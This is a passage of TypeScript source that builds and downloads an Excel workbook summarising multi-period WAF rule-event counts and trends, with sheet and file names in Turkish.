  XLSX.utils.book_append_sheet(wb, wsP, 'Donem_Ozet_ve_Metrikler');

  // Sheet 2: Coklu_Donem_Trend_Matrisi
  const tHeaders = [
    'Policy Name',
    'Rule / Event Name',
    'Threat Type',
    ...res.periods.map((p) => `${p.label} (Adet)`),
    'Genel Eğilim (Trend)',
  ];
  const tRows = res.signatures.map((sig) => [
    sig.policyId,
    sig.name,
    sig.threatType,
    ...res.periods.map((p) => sig.counts[p.periodId] || 0),
    sig.trendLabel,
  ]);
  const wsT = XLSX.utils.aoa_to_sheet([tHeaders, ...tRows]);
  XLSX.utils.book_append_sheet(wb, wsT, 'Coklu_Donem_Trend_Matrisi');

  return wb;
}

export function exportMultiPeriodComparisonToExcel(res: MultiPeriodComparisonResult, filename?: string): void {
  const wb = buildMultiPeriodWorkbook(res);
  const name =
    filename || `WAF_Coklu_Donem_Trend_Raporu_${new Date().toISOString().slice(0, 10)}.xlsx`;
  const wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
  const blob = new Blob([wbout], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
